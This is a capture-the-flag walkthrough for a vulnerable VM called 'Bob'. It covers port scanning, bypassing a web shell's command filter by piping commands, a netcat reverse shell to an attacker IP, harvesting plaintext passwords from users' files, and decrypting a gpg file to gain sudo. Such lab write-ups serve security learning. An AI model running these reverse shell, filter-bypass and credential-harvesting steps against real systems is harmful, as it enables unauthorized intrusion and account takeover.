# init

## scan
+ initial nmap scan `nmap -A -T4 -oA bob_nmap_scan 10.0.2.6` revealed only a http server running on port 80
+ interesting page entries were already presented through robots.txt contents, presented by nmap:
  - login.php
  - dev_shell.php
  - lat_memo.html
  - passwords.html

## webserver
passwords.html
+ _user_ bob (or probably an admin) removed the passwords file from the webserver and suggests the use of password hashes 

lat_memo.html
+ bob mentions a recent breach and a webshell running on the server
+ some form of windows filter is in place

login.html
+ currently disabled

dev_shell.php
+ grants access to a command shell
+ certain comands are allowed, like date and echo
+ others are filtered like `ls`
+ also commands separated by `;` like `echo ""; ls` get filtered
+ not filtered are: `python -c ...`, `echo ls`, and pipes
+ so `echo | ls` already bypasses the filter in place

by searching through user data proftpd can be found in \home\bob\Downloads

## shell
Start shell from dev_shell with `echo | nc <attacker-IP> 1234 -e /bin/bash` thanks to bsd netcat being installed.
Upgrade shell by first using __python pty__. Afterwards, send it to background with `CTRL-Z`, then
get current Kali info with
```
echo $TERM
stty -a
```
Get the Term type info like _xterm-256color_ and row and column numbers.
In the next step set tty to raw and echo with `stty raw -echo`, foreground the netcat session with `fg` and `reset` the session.
This should already make the session more useable.
If not the following variables have to be exported:
```
export SHELL=bash
export TERM=<term-variable>
stty rows <rows> columns <columns>
```

## user accounts
From a better shell it is easy to look around in bob's home dir, where the hidden file __.old_passwords.html__ can be found.
A text file in the elliot user directory further reveals the admin bob has strange wallpaper guidelines and elliots password is: theadminisdumb.
Contents:
```html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
```
The user bob also has a pgp encrypted ?! file in his Documents directory as well as two executable python scripts owned by bob and a proftpd install.

Switch user to either jc, elliot or seb `su seb` using the provided passwords.

## services and ports
From the process list `ps aux` the following information can be gathered:
+ sshdaemon is running
+ page uses mdns with domain name Milburg-High.local
+ exim4 runs (mailserver)
+ apache runs

This can also be confirmed by listing all active systemd services `systemctl list-units --type=service --state=running`

```
seb@Milburg-High:/home/bob$ systemctl list-units --type=service --state=running
UNIT                      LOAD   ACTIVE SUB     DESCRIPTION                                                                                                                    
apache2.service           loaded active running The Apache HTTP Server                                                                                                         
avahi-daemon.service      loaded active running Avahi mDNS/DNS-SD Stack                                                                                                        
cron.service              loaded active running Regular background program processing daemon                                                                                   
dbus.service              loaded active running D-Bus System Message Bus                                                                                                       
exim4.service             loaded active running LSB: exim Mail Transport Agent                                                                                                 
getty@tty1.service        loaded active running Getty on tty1                                                                                                                  
lightdm.service           loaded active running Light Display Manager                                                                                                          
ModemManager.service      loaded active running Modem Manager                                                                                                                  
NetworkManager.service    loaded active running Network Manager                                                                                                                
polkit.service            loaded active running Authorization Manager                                                                                                          
rsyslog.service           loaded active running System Logging Service                                                                                                         
rtkit-daemon.service      loaded active running RealtimeKit Scheduling Policy Service                                                                                          
ssh.service               loaded active running OpenBSD Secure Shell server                                                                                                    
systemd-journald.service  loaded active running Journal Service                                                                                                                
systemd-logind.service    loaded active running Login Service                                                                                                                  
systemd-timesyncd.service loaded active running Network Time Synchronization                                                                                                   
systemd-udevd.service     loaded active running udev Kernel Device Manager                                                                                                     
user@1002.service         loaded active running User Manager for UID 1002                                                                                                      
user@112.service          loaded active running User Manager for UID 112                                                                                                       

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

19 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
```

The output of `grep Port /etc/ssh/sshd_config` reveals that the ssh server is running on 25468.
Further services and their port numbers can be revealed with `ss -tlpn`, due to some config files, like exim, being only accessible by root. 
This reveals services at ports:
```
elliot@Milburg-High:/etc/exim4$ ss -tnlp
State      Recv-Q Send-Q                                           Local Address:Port                                                          Peer Address:Port
LISTEN     0      20                                                   127.0.0.1:25                                                                       *:*
LISTEN     0      128                                                          *:25468                                                                    *:*
LISTEN     0      1                                                            *:38597                                                                    *:*
LISTEN     0      1                                                            *:36201                                                                    *:*
LISTEN     0      1                                                            *:34669                                                                    *:*
LISTEN     0      128                                                         :::80                                                                      :::*
LISTEN     0      20                                                         ::1:25                                                                      :::*
LISTEN     0      128                                                         :::25468                                                                   :::*
```

Exim being owned and executed by root means an RCE exploit would grant a root shell.
After scanning these 3 services with `nmap --script=vuln` all of them went down.
Port 25 is blocked from remote but via `nc localhost 25` a connection to the exim service can be stablished.  

## back to bob

User bob has some interesting files in his download directory, among them are a proftpd installation with a backdoor and a program called wheel of fortune. 

Bobs Documents contain some "porn" directories, which can be searched with `ls -R` because `tree` is not installed. A textfile named notes.sh contains multiple sentences whose starting letters form the word __HARPOCRATES__. This phrase can be used to decrypt `gpg --decrypt login.txt.gpg`, revealing the password b0bcat_ used by bob.
Since bob is in sudoers, the flag can be read.

If a wrong password is entered the first time it is stored by the gpg-agent, this can be forgotten with `gpgconf --reload gpg-agent`.
